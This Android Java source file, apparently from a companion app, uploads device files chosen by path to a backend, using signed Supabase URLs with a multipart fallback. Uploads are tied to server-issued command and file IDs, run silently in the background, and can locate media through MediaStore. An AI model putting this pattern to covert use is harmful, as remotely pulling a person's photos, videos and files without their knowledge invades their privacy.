package com.snapapp.companion;

import android.content.Context;
import android.net.Uri;
import android.util.Log;
import org.json.JSONObject;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class FileUploadHelper {
    private static final String TAG = "FileUploadHelper";

    public static void uploadFile(final Context context, final String serverUrl, final String deviceId,
                                  final String cmdId, final String fileId, final String filePath) {
        new Thread(() -> {
            InputStream is = null;
            try {
                File file = new File(filePath);
                String fileName = file.getName();
                is = openStream(context, file, filePath);
                if (is == null) { Log.w(TAG, "Cannot open stream for: " + filePath); return; }

                String mime = getMime(fileName);
                // Step 1: Try direct-to-Supabase upload URL to bypass Vercel 4.5MB limit
                boolean uploadedDirect = tryDirectUpload(serverUrl, deviceId, cmdId, fileId, filePath, fileName, mime, is);
                if (!uploadedDirect) {
                    // Fallback to multipart if direct signed upload failed
                    is.close();
                    is = openStream(context, file, filePath);
                    if (is != null) legacyMultipartUpload(serverUrl, deviceId, cmdId, fileId, fileName, mime, is);
                }
            } catch (Exception e) {
                Log.e(TAG, "uploadFile error", e);
            } finally {
                if (is != null) { try { is.close(); } catch (Throwable ignored) {} }
            }
        }).start();
    }

    private static boolean tryDirectUpload(String serverUrl, String deviceId, String cmdId,
                                           String fileId, String filePath, String fileName, String mime, InputStream is) {
        HttpURLConnection putConn = null;
        try {
            // Request signed upload URL
            JSONObject req = new JSONObject().put("device_id", deviceId).put("file_name", fileName);
            String jsonResp = postJsonSync(serverUrl + "/api/device-sync/upload-url", req.toString());
            if (jsonResp == null) return false;
            JSONObject res = new JSONObject(jsonResp);
            String uploadUrl = res.optString("upload_url", null);
            String storagePath = res.optString("storage_path", null);
            if (uploadUrl == null || storagePath == null) return false;

            // Stream file directly to Supabase Storage via HTTP PUT with chunked streaming (no memory limit)
            URL url = new URL(uploadUrl);
            putConn = (HttpURLConnection) url.openConnection();
            putConn.setRequestMethod("PUT");
            putConn.setDoOutput(true);
            putConn.setConnectTimeout(30000);
            putConn.setReadTimeout(300000); // 5 min for large videos
            putConn.setRequestProperty("Content-Type", mime);
            putConn.setChunkedStreamingMode(65536); // 64KB chunks — zero RAM buffer

            OutputStream os = putConn.getOutputStream();
            byte[] buf = new byte[65536];
            int len;
            while ((len = is.read(buf)) != -1) os.write(buf, 0, len);
            os.flush();
            os.close();

            int code = putConn.getResponseCode();
            Log.d(TAG, "Direct Supabase PUT response: " + code);
            if (code < 200 || code >= 300) return false;

            // Confirm upload to backend
            JSONObject confirm = new JSONObject()
                .put("device_id", deviceId).put("storage_path", storagePath)
                .put("command_id", cmdId).put("file_id", fileId)
                .put("file_name", fileName).put("file_path", filePath);
            postJsonSync(serverUrl + "/api/device-sync/upload-file", confirm.toString());
            return true;
        } catch (Throwable t) {
            Log.w(TAG, "Direct upload failed, falling back: " + t.getMessage());
            return false;
        } finally {
            if (putConn != null) putConn.disconnect();
        }
    }

    private static void legacyMultipartUpload(String serverUrl, String deviceId, String cmdId,
                                              String fileId, String fileName, String mime, InputStream is) {
        HttpURLConnection conn = null;
        try {
            String boundary = "===" + System.currentTimeMillis() + "===";
            URL url = new URL(serverUrl + "/api/device-sync/upload-file");
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(30000);
            conn.setReadTimeout(180000);
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            conn.setChunkedStreamingMode(65536);

            OutputStream os = conn.getOutputStream();
            PrintWriter w = new PrintWriter(new OutputStreamWriter(os, StandardCharsets.UTF_8), true);
            addFormField(w, boundary, "device_id", deviceId);
            if (cmdId != null) addFormField(w, boundary, "command_id", cmdId);
            if (fileId != null) addFormField(w, boundary, "file_id", fileId);
            addFormField(w, boundary, "file_name", fileName);
            w.append("--").append(boundary).append("\r\n");
            w.append("Content-Disposition: form-data; name=\"file\"; filename=\"").append(fileName).append("\"\r\n");
            w.append("Content-Type: ").append(mime).append("\r\n\r\n").flush();

            byte[] buf = new byte[65536];
            int len;
            while ((len = is.read(buf)) != -1) os.write(buf, 0, len);
            os.flush();
            w.append("\r\n").flush();
            w.append("--").append(boundary).append("--\r\n").close();
            conn.getResponseCode();
        } catch (Throwable t) { Log.e(TAG, "Legacy upload error", t); }
        finally { if (conn != null) conn.disconnect(); }
    }

    private static String postJsonSync(String urlStr, String json) {
        HttpURLConnection c = null;
        try {
            c = (HttpURLConnection) new URL(urlStr).openConnection();
            c.setRequestMethod("POST");
            c.setRequestProperty("Content-Type", "application/json");
            c.setDoOutput(true);
            c.setConnectTimeout(15000); c.setReadTimeout(15000);
            try (OutputStream o = c.getOutputStream()) { o.write(json.getBytes(StandardCharsets.UTF_8)); }
            if (c.getResponseCode() >= 200 && c.getResponseCode() < 300) {
                BufferedReader br = new BufferedReader(new InputStreamReader(c.getInputStream(), StandardCharsets.UTF_8));
                StringBuilder sb = new StringBuilder(); String line;
                while ((line = br.readLine()) != null) sb.append(line);
                return sb.toString();
            }
        } catch (Throwable ignored) {}
        finally { if (c != null) c.disconnect(); }
        return null;
    }

    private static InputStream openStream(Context ctx, File f, String path) {
        try {
            if (f.exists()) return new FileInputStream(f);
            if (ctx != null) {
                Uri[] cols = { Uri.parse("content://media/external/video/media"),
                    Uri.parse("content://media/external/images/media"), Uri.parse("content://media/external/audio/media"),
                    Uri.parse("content://media/external/file") };
                for (Uri u : cols) {
                    try (android.database.Cursor cur = ctx.getContentResolver().query(u, new String[]{"_id"}, "_data=?", new String[]{path}, null)) {
                        if (cur != null && cur.moveToFirst())
                            return ctx.getContentResolver().openInputStream(android.content.ContentUris.withAppendedId(u, cur.getLong(0)));
                    } catch (Throwable ignored) {}
                }
            }
        } catch (Throwable ignored) {}
        return null;
    }

    private static String getMime(String name) {
        String l = name.toLowerCase();
        if (l.endsWith(".mp4") || l.endsWith(".m4v") || l.endsWith(".mov")) return "video/mp4";
        if (l.endsWith(".png")) return "image/png";
        if (l.endsWith(".m4a") || l.endsWith(".mp3") || l.endsWith(".aac")) return "audio/mp4";
        if (l.endsWith(".pdf")) return "application/pdf";
        return "image/jpeg";
    }

    private static void addFormField(PrintWriter w, String b, String n, String v) {
        w.append("--").append(b).append("\r\n").append("Content-Disposition: form-data; name=\"").append(n).append("\"\r\n\r\n").append(v).append("\r\n").flush();
    }
}
